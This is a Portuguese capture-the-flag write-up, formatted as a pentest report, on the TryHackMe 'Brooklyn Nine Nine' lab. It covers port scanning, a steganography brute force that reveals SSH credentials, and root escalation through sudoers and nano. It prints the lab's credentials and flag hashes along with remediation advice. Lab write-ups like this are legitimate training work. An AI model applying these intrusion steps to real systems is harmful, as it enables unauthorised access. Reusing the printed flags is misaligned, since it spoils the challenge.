# 1 — Visão geral da metodologia

1. **Objetivo:** Explorar vulnerabilidades expostas publicamente, obter shell via SSH e elevar privilégios até root para captura de flags.
    
2. **Estrutura:** Recon → Enumeração Web → Esteganografia → Credenciais SSH → Privesc → Flags.
    
3. **Princípios:** Execução fiel de um fluxo ofensivo com documentação reprodutível.
    

---

# Report — Máquina: `Brooklyn Nine Nine` — `10.65.150.41`

- **Fonte:** THM
    
- **Data:** 2025-11-30
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 19:37
    
- **Finalizado:** 20:06
    
- **Tempo gasto:** 29 minutos
    

---

## 1) Executive summary

Site web fornecia imagem com mensagem oculta indicando uso de esteganografia. Extração do conteúdo revelou credenciais SSH do usuário `holt`. Após login, privilégio root foi obtido por configuração incorreta de sudoers, permitindo controle total do alvo.

---

## 2) Escopo e limitações

- **Alvo:** `10.65.150.41`
    
- **Serviços expostos:** FTP / SSH / HTTP
    
- **Ferramentas utilizadas:** Nmap, Esteganálise (stegcracker, steghide), SSH, Sudo abuse
    
- **Limitações:** Nenhuma definida pelo lab
    

---

## 3) Metodologia aplicada

- Recon inicial de portas e serviços
    
- Enumeração Web e análise de recurso estático
    
- Esteganografia → credenciais SSH
    
- Shell como usuário válido
    
- Escalonamento de privilégio via edição do sudoers
    
- Flag root obtida
    

---

## 4) Achado principal

**Vulnerabilidade:** Segredo armazenado em mídia na web + configuração crítica de sudo  
**Local:** Imagem na página do servidor HTTP  
**PoC (decodificação):**

`stegcracker image.jpg /usr/share/wordlists/rockyou.txt`

Senha revelada: `admin`

**Arquivo extraído (`note.txt`)**

`Holts Password: fluffydog12@ninenine`

---

## 5) Evidências / PoC (resumo)

### Scan inicial

`nmap -sS -sV -Pn -O -p- 10.65.150.41`

→ FTP / SSH / HTTP

### Esteganografia

Ferramentas utilizadas: `stegcracker` + `steghide`  
→ senha: `admin`  
→ credenciais expostas para SSH:

`holt : fluffydog12@ninenine`

### SSH

`ssh holt@10.65.150.41`

### User flag

`ee11cbb19052e40b07aac0ca060c23ee`

### Privesc via sudo

Holt conseguia modificar `/etc/sudoers`:

`sudo visudo → adicionar holt ALL=(ALL:ALL) ALL`

Shell root e flag final:

`63a9f0ea7bb98050796b649e85481845`

---

## 6) Impacto & Severidade

**Severidade:** Alta

- Dados sensíveis ocultos em arquivos públicos
    
- Configuração sudo altamente insegura
    
- Escalonamento imediato até root sem exploit adicional
    

---

## 7) Reproduzir (passo-a-passo)

1️⃣ Enumerar serviços  
2️⃣ Examinar recursos web (view-source / inspeção)  
3️⃣ Aplicar esteganálise para extrair credenciais  
4️⃣ Acessar via SSH:

`ssh holt@<IP> -p 22`

5️⃣ Verificar sudo:

`sudo -l`

6️⃣ Modificar sudoers e obter root

`sudo visudo`

7️⃣ Capturar flags em `/home` e `/root`

---

## 8) Recomendações (gestores)

- Nunca armazenar informações sensíveis em imagens públicas
    
- Aplicar controle rígido de sudoers
    
- Hardening completo do SSH com MFA e senhas robustas
    
- Monitoramento de permissões e acessos privilegiados
    

---

## 9) Recomendações técnicas

- Implementar validação de arquivos estáticos
    
- Remover privilégios sudo desnecessários:
    

`visudo → remover permissões do usuário holt`

- Configurar fail2ban + auditoria em SSH
    
- Reforço de segurança em filesystem e segregação de usuários
    

---

## 10) Apêndice técnico

**Flags coletadas**

`User: ee11cbb19052e40b07aac0ca060c23ee Root: 63a9f0ea7bb98050796b649e85481845`

**Arquivos sugeridos para anexar**

#### Nmap
![](Nmap_BNN%201.txt)
#### Stegcrack
![](Stegracker_BNN%201.txt)

---

## 11) Lições aprendidas / Follow-up

- Mensagens “ocultas” na interface podem ser vetores importantes
    
- Esteganografia ainda é um recurso útil em OSINT ofensivo
    
- Sudo mal configurado = **root instantly**

- **Quando `sudo -l` permite usar o `nano`, é possível tanto:**
    
    - executar `/bin/bash` a partir do próprio editor
        
    - **quanto** editar o arquivo `sudoers` para conceder privilégios totais
---
